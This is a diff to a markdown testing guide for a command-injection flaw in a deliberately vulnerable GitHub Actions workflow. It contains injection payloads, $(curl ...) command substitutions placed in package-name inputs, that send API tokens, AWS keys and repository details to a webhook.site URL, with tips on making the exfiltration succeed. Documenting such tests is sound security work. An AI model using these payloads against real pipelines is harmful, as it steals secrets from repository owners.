@@ -14,11 +14,11 @@ Quick reference for testing the vulnerability with corrected attack vectors base
 
 ### 1. Secret Exfiltration via Command Substitution (WORKS - Most Dangerous)
 
-**Target:** `vulnerable.yml` - Pattern 6 (Send notification step with secrets in env)
+**Target:** `vulnerable.yml` - Pattern 3 (Secrets in env with direct interpolation)
 
 **Package name:**
 ```
-$(curl https://webhook.site/YOUR-WEBHOOK-ID?token=$API_TOKEN&aws=$AWS_KEY)
+$(curl "https://webhook.site/YOUR-WEBHOOK-ID?token=$API_TOKEN&aws=$AWS_KEY")
 ```
 
 **Package version:**
@@ -28,8 +28,13 @@ $(curl https://webhook.site/YOUR-WEBHOOK-ID?token=$API_TOKEN&aws=$AWS_KEY)
 
 **Expected result:**
 - ✅ Curl executes during command substitution
-- ✅ Webhook receives GET request with both secrets in query parameters
+- ✅ Webhook receives GET request with **both secrets** in query parameters
 - ✅ Demonstrates that secrets in `env:` can be exfiltrated via command injection
+
+**Key Details:**
+- URL **must be quoted** to prevent bash from interpreting `&` as background operator
+- Without quotes, only `token` parameter is sent, `aws=$AWS_KEY` runs as background job
+- Command substitution has full access to all environment variables in the step
 
 **Why it's critical:** Even though the workflow uses `env:` to set secrets (which is safer than direct `${{ }}` in run), if the **input** still uses direct interpolation `${{ inputs.package_name }}`, an attacker can inject command substitution that accesses the environment variables.
 
@@ -43,27 +48,34 @@ run: |
 ```
 
 **What happens:**
-1. GitHub expands `${{ inputs.package_name }}` → `$(curl https://webhook.site/...?token=$API_TOKEN&aws=$AWS_KEY)`
+1. GitHub expands `${{ inputs.package_name }}` → `$(curl "https://webhook.site/...?token=$API_TOKEN&aws=$AWS_KEY")`
 2. Shell executes command substitution, which has access to `$API_TOKEN` and `$AWS_KEY` from env
-3. Secrets are exfiltrated to the webhook
+3. Both secrets are exfiltrated to the webhook
 
 ---
 
-### 2. GitHub Environment Variable Exfiltration (WORKS)
+### 2. Basic Command Injection (WORKS - Demonstrates Vulnerability)
 
-**Target:** `vulnerable.yml` - Any step with direct interpolation
+**Target:** `vulnerable.yml` - Pattern 2 (No secrets in environment)
 
 **Package name:**
 ```
-$(curl https://webhook.site/YOUR-WEBHOOK-ID?repo=$GITHUB_REPOSITORY&actor=$GITHUB_ACTOR&ref=$GITHUB_REF)
+$(curl "https://webhook.site/YOUR-WEBHOOK-ID?repo=$GITHUB_REPOSITORY&actor=$GITHUB_ACTOR")
 ```
 
 **Expected result:**
 - ✅ Curl executes (see progress output in logs)
 - ✅ Webhook receives GET request with repository info
-- ✅ Proves command injection works and can exfiltrate environment data
+- ✅ Proves command injection works
+- ❌ No secrets exfiltrated (Pattern 2 has no secrets in env)
 
-**Why it works:** GitHub Actions provides default environment variables like `$GITHUB_REPOSITORY`, `$GITHUB_ACTOR`, etc. These are always available in the shell. The `$(...)` command substitution executes before the main command and can access any environment variables.
+**Purpose:** Demonstrates that direct `${{ }}` interpolation allows arbitrary command execution, even when the step doesn't have secrets. This is useful for:
+- Proving the vulnerability exists
+- Exfiltrating GitHub-provided environment variables
+- Running reconnaissance commands
+- Setting up for attacks on later steps
+
+**Why it works:** GitHub Actions provides default environment variables like `$GITHUB_REPOSITORY`, `$GITHUB_ACTOR`, etc. These are always available in the shell. The `$(...)` command substitution executes before the main command.
 
 ---
 
